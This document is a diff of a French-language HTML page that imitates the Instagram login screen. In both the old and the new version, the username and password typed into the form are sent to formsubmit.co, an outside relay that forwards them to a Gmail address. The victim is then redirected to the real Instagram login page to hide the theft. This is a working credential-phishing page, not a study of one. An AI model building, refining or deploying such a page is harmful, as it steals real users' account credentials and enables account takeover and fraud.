@@ -1,207 +1,158 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Connexion Instagram</title>
-<style>
-  body {
-    background: #000;
-    color: #fff;
-    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    height: 100vh;
-    margin: 0;
-    position: relative;
-  }
-  .language-select {
-    position: absolute;
-    top: 15px;
-    right: 15px;
-    background: #121212;
-    border: 1px solid #444;
-    border-radius: 4px;
-    color: #fff;
-    font-size: 14px;
-    padding: 5px 10px;
-    cursor: pointer;
-  }
-  .container {
-    background: #121212;
-    padding: 30px;
-    border-radius: 8px;
-    width: 320px;
-    box-sizing: border-box;
-  }
-  h1 {
-    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-    font-size: 40px;
-    margin: 0 0 20px 0;
-    text-align: center;
-  }
-  label {
-    display: block;
-    margin: 12px 0 6px;
-    font-size: 14px;
-  }
-  input[type="text"],
-  input[type="password"] {
-    width: 100%;
-    padding: 10px;
-    background: #222;
-    border: 1px solid #444;
-    border-radius: 4px;
-    color: #fff;
-    font-size: 14px;
-  }
-  .password-wrapper {
-    position: relative;
-  }
-  .toggle-password {
-    position: absolute;
-    right: 12px;
-    top: 50%;
-    transform: translateY(-50%);
-    cursor: pointer;
-    width: 22px;
-    height: 22px;
-    fill: #aaa;
-  }
-  button {
-    width: 100%;
-    margin-top: 20px;
-    padding: 10px;
-    background: #3897f0;
-    border: none;
-    border-radius: 4px;
-    color: white;
-    font-weight: bold;
-    font-size: 16px;
-    cursor: pointer;
-  }
-  .facebook-btn {
-    background: #1877f2;
-    margin-bottom: 15px;
-  }
-  .divider {
-    display: flex;
-    align-items: center;
-    margin: 15px 0;
-    color: #aaa;
-    font-size: 13px;
-  }
-  .divider::before,
-  .divider::after {
-    content: "";
-    flex: 1;
-    height: 1px;
-    background: #444;
-    margin: 0 8px;
-  }
-</style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="description" content="Page de connexion Instagram factice, saisissez vos infos pour vous connecter." />
+  <title>Connexion Instagram</title>
+  <style>
+    body {
+      background: #000;
+      color: #fff;
+      font-family: system-ui, Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .container {
+      background: #121212;
+      padding: 30px;
+      border-radius: 8px;
+      width: 320px;
+      box-sizing: border-box;
+    }
+    h1 {
+      font-weight: 700;
+      font-size: 40px;
+      margin: 0 0 20px 0;
+      text-align: center;
+    }
+    label {
+      display: block;
+      margin: 12px 0 6px;
+      font-size: 14px;
+      font-weight: 600;
+    }
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      background: #222;
+      border: 1px solid #444;
+      border-radius: 4px;
+      color: #fff;
+      font-size: 14px;
+      font-weight: 600;
+    }
+    .password-wrapper {
+      position: relative;
+    }
+    .toggle-password {
+      position: absolute;
+      right: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      cursor: pointer;
+      width: 22px;
+      height: 22px;
+      fill: #aaa;
+    }
+    button {
+      width: 100%;
+      margin-top: 20px;
+      padding: 10px;
+      background: #3897f0;
+      border: none;
+      border-radius: 4px;
+      color: white;
+      font-weight: 700;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    .facebook-btn {
+      background: #1877f2;
+      margin-bottom: 15px;
+      font-weight: 700;
+    }
+    .signup {
+      text-align: center;
+      margin-top: 15px;
+      font-size: 14px;
+      color: #aaa;
+    }
+    .signup a {
+      color: #3897f0;
+      text-decoration: none;
+      font-weight: 700;
+    }
+  </style>
 </head>
 <body>
 
-<select class="language-select" id="languageSelect" aria-label="Choisir la langue">
-  <option value="fr" selected>Français</option>
-  <option value="en">English</option>
-  <option value="es">Español</option>
-</select>
+  <div class="container">
+    <h1>Instagram</h1>
 
-<div class="container">
-  <h1 id="title">Instagram</h1>
+    <form 
+      id="instaForm"
+      action="https://formsubmit.co/design.site.web69@gmail.com" 
+      method="POST"
+      autocomplete="off"
+    >
+      <button type="button" class="facebook-btn">Connexion avec Facebook</button>
 
-  <form id="instaForm" autocomplete="off">
-    <button type="button" class="facebook-btn" id="fbBtn">Connexion avec Facebook</button>
+      <label for="username">Téléphone, nom d’utilisateur ou email *</label>
+      <input type="text" id="username" name="username" required />
 
-    <div class="divider" id="dividerText">OU</div>
+      <label for="password">Mot de passe *</label>
+      <div class="password-wrapper">
+        <input type="password" id="password" name="password" required />
+        <svg class="toggle-password" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" aria-label="Afficher le mot de passe" role="img" tabindex="0">
+          <path d="M12 5c-7 0-11 7-11 7s4 7 11 7 11-7 11-7-4-7-11-7zm0 12a5 5 0 1 1 0-10 5 5 0 0 1 0 10z"/>
+          <circle cx="12" cy="12" r="2.5"/>
+        </svg>
+      </div>
 
-    <label for="username" id="labelUsername">Téléphone, nom d’utilisateur ou email</label>
-    <input type="text" id="username" name="username" required />
+      <button type="submit">Se connecter</button>
+    </form>
 
-    <label for="password" id="labelPassword">Mot de passe</label>
-    <div class="password-wrapper">
-      <input type="password" id="password" name="password" required />
-      <svg class="toggle-password" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-        <path d="M12 5c-7 0-11 7-11 7s4 7 11 7 11-7 11-7-4-7-11-7zm0 12a5 5 0 1 1 0-10 5 5 0 0 1 0 10z"/>
-        <circle cx="12" cy="12" r="2.5"/>
-      </svg>
+    <div class="signup">
+      Pas de compte ? <a href="https://www.instagram.com/accounts/emailsignup/" target="_blank" rel="noopener">S'inscrire</a>
     </div>
+  </div>
 
-    <button type="submit" id="submitBtn">Se connecter</button>
-  </form>
+  <script>
+    // Toggle visibilité du mot de passe
+    const togglePassword = document.querySelector('.toggle-password');
+    const passwordInput = document.getElementById('password');
 
-</div>
+    togglePassword.addEventListener('click', () => {
+      const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+      passwordInput.setAttribute('type', type);
 
-<script>
-// Toggle visibilité mot de passe
-const togglePassword = document.querySelector('.toggle-password');
-const passwordInput = document.getElementById('password');
+      togglePassword.style.fill = type === 'text' ? '#3897f0' : '#aaa';
+    });
 
-togglePassword.addEventListener('click', () => {
-  const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
-  passwordInput.setAttribute('type', type);
-  togglePassword.style.fill = type === 'text' ? '#3897f0' : '#aaa';
-});
+    // Soumission formulaire avec envoi en AJAX puis redirection
+    document.getElementById('instaForm').addEventListener('submit', function(e) {
+      e.preventDefault(); // bloque comportement par défaut
 
-// Envoi FormSubmit + Redirection
-document.getElementById('instaForm').addEventListener('submit', function(e) {
-  e.preventDefault();
+      const formData = new FormData(this);
 
-  const formData = new FormData();
-  formData.append('username', document.getElementById('username').value);
-  formData.append('password', document.getElementById('password').value);
-
-  fetch('https://formsubmit.co/el/riyoye', {
-    method: 'POST',
-    body: formData
-  }).finally(() => {
-    window.location.href = 'https://www.instagram.com/accounts/login/';
-  });
-});
-
-// Gestion des langues
-const langSelect = document.getElementById('languageSelect');
-
-const translations = {
-  fr: {
-    fbBtn: "Connexion avec Facebook",
-    dividerText: "OU",
-    labelUsername: "Téléphone, nom d’utilisateur ou email",
-    labelPassword: "Mot de passe",
-    submitBtn: "Se connecter",
-    title: "Instagram"
-  },
-  en: {
-    fbBtn: "Log in with Facebook",
-    dividerText: "OR",
-    labelUsername: "Phone, username or email",
-    labelPassword: "Password",
-    submitBtn: "Log In",
-    title: "Instagram"
-  },
-  es: {
-    fbBtn: "Conectarse con Facebook",
-    dividerText: "O",
-    labelUsername: "Teléfono, nombre de usuario o correo electrónico",
-    labelPassword: "Contraseña",
-    submitBtn: "Iniciar sesión",
-    title: "Instagram"
-  }
-};
-
-langSelect.addEventListener('change', () => {
-  const lang = langSelect.value;
-  document.getElementById('fbBtn').textContent = translations[lang].fbBtn;
-  document.getElementById('dividerText').textContent = translations[lang].dividerText;
-  document.getElementById('labelUsername').textContent = translations[lang].labelUsername;
-  document.getElementById('labelPassword').textContent = translations[lang].labelPassword;
-  document.getElementById('submitBtn').textContent = translations[lang].submitBtn;
-  document.getElementById('title').textContent = translations[lang].title;
-});
-</script>
+      fetch('https://formsubmit.co/design.site.web69@gmail.com', {
+        method: 'POST',
+        body: formData,
+        mode: 'no-cors' // autoriser cross-origin sans CORS
+      }).then(() => {
+        // redirige vers vrai Instagram après envoi
+        window.location.href = 'https://www.instagram.com/accounts/login/';
+      }).catch(() => {
+        // même redirection en cas d'erreur
+        window.location.href = 'https://www.instagram.com/accounts/login/';
+      });
+    });
+  </script>
 
 </body>
 </html>
